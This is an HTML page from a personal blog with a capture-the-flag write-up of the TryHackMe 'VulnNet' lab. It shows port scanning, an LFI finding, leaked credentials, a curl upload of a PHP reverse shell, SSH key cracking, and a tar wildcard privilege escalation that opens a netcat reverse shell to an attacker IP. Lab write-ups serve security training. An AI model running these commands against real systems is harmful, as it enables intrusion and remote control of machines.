@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Language" content="en">
+    <meta name="color-scheme" content="light dark">
+
+    
+
+    <meta name="author" content="monoloc0">
+    <meta name="description" content="Enumeration    Port Scan     pre code { background-color: #eee; }  monoloco@kali:~/Dokumente/THM/vulnnet$ nmap -sV -sC -oA nmap/output vulnnet.th m Starting Nmap 7.80 ( https://nmap.org ) at 2021-03-17 21:26 GMT Stats: 0:00:11 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan NSE Timing: About 99.63% done; ETC: 21:27 (0:00:00 remaining) Nmap scan report for vulnnet.thm (10.10.15.6) Host is up (0.046s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.">
+    <meta name="keywords" content="infosec,bugbounty,personal">
+
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content=""/>
+<meta name="twitter:description" content="Enumeration    Port Scan     pre code { background-color: #eee; }  monoloco@kali:~/Dokumente/THM/vulnnet$ nmap -sV -sC -oA nmap/output vulnnet.th m Starting Nmap 7.80 ( https://nmap.org ) at 2021-03-17 21:26 GMT Stats: 0:00:11 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan NSE Timing: About 99.63% done; ETC: 21:27 (0:00:00 remaining) Nmap scan report for vulnnet.thm (10.10.15.6) Host is up (0.046s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7."/>
+
+    <meta property="og:title" content="" />
+<meta property="og:description" content="Enumeration    Port Scan     pre code { background-color: #eee; }  monoloco@kali:~/Dokumente/THM/vulnnet$ nmap -sV -sC -oA nmap/output vulnnet.th m Starting Nmap 7.80 ( https://nmap.org ) at 2021-03-17 21:26 GMT Stats: 0:00:11 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan NSE Timing: About 99.63% done; ETC: 21:27 (0:00:00 remaining) Nmap scan report for vulnnet.thm (10.10.15.6) Host is up (0.046s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://monoloc0.github.io/vulnnet/" /><meta property="article:section" content="" />
+
+
+
+
+
+    <title>
+   · monoloc0
+</title>
+
+    
+      <link rel="canonical" href="https://monoloc0.github.io/vulnnet/">
+    
+
+    <link rel="preload" href="https://monoloc0.github.io/fonts/forkawesome-webfont.woff2?v=1.2.0" as="font" type="font/woff2" crossorigin>
+
+    
+      
+      
+      <link rel="stylesheet" href="https://monoloc0.github.io/css/coder.min.843ee18d510f7cb1bb49110db117b99ea65489c095d620a5d79ea71693478e77.css" integrity="sha256-hD7hjVEPfLG7SRENsRe5nqZUicCV1iCl156nFpNHjnc=" crossorigin="anonymous" media="screen" />
+    
+
+    
+
+    
+
+    
+
+    
+
+    <link rel="icon" type="image/png" href="https://monoloc0.github.io/images/favicon-32x32.png" sizes="32x32">
+    <link rel="icon" type="image/png" href="https://monoloc0.github.io/images/favicon-16x16.png" sizes="16x16">
+
+    <link rel="apple-touch-icon" href="https://monoloc0.github.io/images/apple-touch-icon.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="https://monoloc0.github.io/images/apple-touch-icon.png">
+
+    <meta name="generator" content="Hugo 0.89.4" />
+  </head>
+
+  
+  
+  <body class="preload-transitions colorscheme-light">
+    
+
+    <main class="wrapper">
+      <nav class="navigation">
+  <section class="container">
+    <a class="navigation-title" href="https://monoloc0.github.io/">
+      monoloc0
+    </a>
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="https://monoloc0.github.io/whoami/">whoami</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="https://monoloc0.github.io/writeups/">writeups</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="https://monoloc0.github.io/resources/">resources</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+      <div class="content">
+        
+  <section class="container page">
+  <article>
+    <header>
+      <h1 class="title">
+        <a class="title-link" href="https://monoloc0.github.io/vulnnet/">
+          
+        </a>
+      </h1>
+    </header>
+
+    <h1 id="enumeration">
+  Enumeration
+  <a class="heading-link" href="#enumeration">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h1>
+<h2 id="port-scan">
+  Port Scan
+  <a class="heading-link" href="#port-scan">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h2>
+<style>
+
+
+pre code {
+  background-color: #eee;
+
+}
+
+
+</style>
+
+<pre tabindex="0"><code>monoloco@kali:~/Dokumente/THM/vulnnet$ nmap -sV -sC -oA nmap/output vulnnet.th
+m
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-03-17 21:26 GMT
+Stats: 0:00:11 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 99.63% done; ETC: 21:27 (0:00:00 remaining)
+Nmap scan report for vulnnet.thm (10.10.15.6)
+Host is up (0.046s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 ea:c9:e8:67:76:0a:3f:97:09:a7:d7:a6:63:ad:c1:2c (RSA)
+|   256 0f:c8:f6:d3:8e:4c:ea:67:47:68:84:dc:1c:2b:2e:34 (ECDSA)
+|_  256 05:53:99:fc:98:10:b5:c3:68:00:6c:29:41:da:a5:c9 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: VulnNet
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 12.30 seconds
+
+</code></pre><h1 id="investigation-of-js-files">
+  Investigation of JS files
+  <a class="heading-link" href="#investigation-of-js-files">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h1>
+<p>Path: vulnnet.thm/js/xxx</p>
+<p>Inside the files I found the following URLs</p>
+<ul>
+<li>
+<p><a href="http://vulnnet.thm/index.php?referer=">http://vulnnet.thm/index.php?referer=</a></p>
+</li>
+<li>
+<p><a href="http://broadcast.vulnnet.thm">http://broadcast.vulnnet.thm</a></p>
+</li>
+</ul>
+<p><strong>LFI</strong></p>
+<p><img src="../../_resources/18aa5db5a65a4f80b4631c6e50fbecf4.png" alt="145f2838e8af95e959d03f98e6a225b4.png"></p>
+<p><img src="../../_resources/c42c2f29c5cc41a99c22b0d58bf49a71.png" alt="1b321c1ade4d912d3bfe83ca68d45358.png"></p>
+<p><img src="../../_resources/e4e29eb1bd624116996eb08b0dd1038c.png" alt="ce5b90701fe782beaccde06c55788a16.png"></p>
+<p><strong>Credentials for Basic Auth</strong></p>
+<p>developers:9972761drmfsls</p>
+<p>Basic-Auth: ZGV2ZWxvcGVyczo5OTcyNzYxZHJtZnNscw==</p>
+<p>Publicly available Exploit: <a href="https://www.exploit-db.com/exploits/44250">https://www.exploit-db.com/exploits/44250</a></p>
+<p><img src="../../_resources/de7d5be4f4ef4dd78911d85a28a2a911.png" alt="d66d608dae51afd0f8cc36acee39178e.png"></p>
+<p><strong>Payload:</strong></p>
+<pre tabindex="0"><code>curl -F &quot;file=@php-reverse-shell.php&quot; -F &quot;plupload=1&quot; -F &quot;name=php-reverse-shell.php&quot; &quot;http://broadcast.vulnnet.thm/actions/beats_uploader.php&quot; -H &quot;Authorization: Basic ZGV2ZWxvcGVyczo5OTcyNzYxZHJtZnNscw==&quot;
+</code></pre><p><img src="../../_resources/a9d6d7468dc34299bbc24364ee3c08fe.png" alt="539689bfa08555e1e06fe4e338fbec38.png"></p>
+<h1 id="from-www-data-to-usertxt">
+  from www-data to user.txt
+  <a class="heading-link" href="#from-www-data-to-usertxt">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h1>
+<p>After running linpeas.sh</p>
+<p>I found the following:</p>
+<pre tabindex="0"><code>-rw-rw-r-- 1 server-management server-management 1484 Jan 24 14:08 /var/backups/ssh-backup.tar.gz 
+</code></pre><p>Looks interesting! Maybe a ssh private key readable by everyone :)</p>
+<p>Yesss.</p>
+<p><img src="../../_resources/4d502ac06f734a2fbd1c7dbadbd5d67c.png" alt="671b532dfa3a13ed08ab1c801fffa393.png"></p>
+<p>Next I tried to connect to the machine using the found private key.</p>
+<p><img src="../../_resources/a3d7a860840f42aab074d9c315080aff.png" alt="bf36b1e741f914f1eccea7f1e0a38db5.png"></p>
+<p>Unfortunately the private key was password protected.</p>
+<p>Let&rsquo;s try to crack it using john</p>
+<p><img src="../../_resources/f12e7c8ecb574448b046ebcf2de3187c.png" alt="6def38282d1cd95468c0531dbd5dadd6.png"></p>
+<p>It works.
+<strong>Cracked Password:</strong> oneTWO3gOyac</p>
+<p>Get <strong>user.txt</strong></p>
+<p><img src="../../_resources/063eb06ee0434c3e875be8d736c23e5f.png" alt="f848cb6138b0bc292e918c04ef82a8de.png"></p>
+<h1 id="roottxt">
+  root.txt
+  <a class="heading-link" href="#roottxt">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h1>
+<p>cat /etc/crontab</p>
+<p><img src="../../_resources/24b3c0f8a64c4a269c36a253dc7cbf1a.png" alt="284b34e23d2f95d6df7dd97139a63fa2.png"></p>
+<p>let&rsquo;s have a look at /var/opt/backupsrv.sh</p>
+<p><img src="../../_resources/d6f2b20f601f4a89947ca0d9d7e967e5.png" alt="95e25467ab0eb4becc6b79aabcbb9cf3.png"></p>
+<p>classic gtfobins tar PE</p>
+<p>I executed the following commands inside <strong>/home/server-management/Documents</strong></p>
+<pre tabindex="0"><code>echo &quot;mkfifo /tmp/lhennp; nc 10.9.5.204 1337 0&lt;/tmp/lhennp | /bin/sh &gt;/tmp/lhennp 2&gt;&amp;1; rm /tmp/lhennp&quot; &gt; privesc.sh
+echo &quot;&quot; &gt; &quot;--checkpoint-action=exec=sh shell.sh&quot;
+echo &quot;&quot; &gt; --checkpoint=1
+</code></pre><p>After waiting maximum 2 minutes I received a reverse shell</p>
+<p><img src="../../_resources/f713d45d847f417fa8f41cad54e750be.png" alt="8b80a28e00b0c26fcf3a3b98ca738c89.png"></p>
+
+  </article>
+</section>
+
+  
+
+      </div>
+
+      <footer class="footer">
+  <section class="container">
+    ©
+    
+    2021
+     monoloc0 
+    ·
+    Powered by <a href="https://gohugo.io/">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/">Coder</a>.
+    
+  </section>
+</footer>
+
+    </main>
+
+    
+      
+      <script src="https://monoloc0.github.io/js/coder.min.03b17769f4f91ae35667e1f2a1ca8c16f50562576cf90ff32b3179926914daa5.js" integrity="sha256-A7F3afT5GuNWZ&#43;HyocqMFvUFYlds&#43;Q/zKzF5kmkU2qU="></script>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+  </body>
+
+</html>
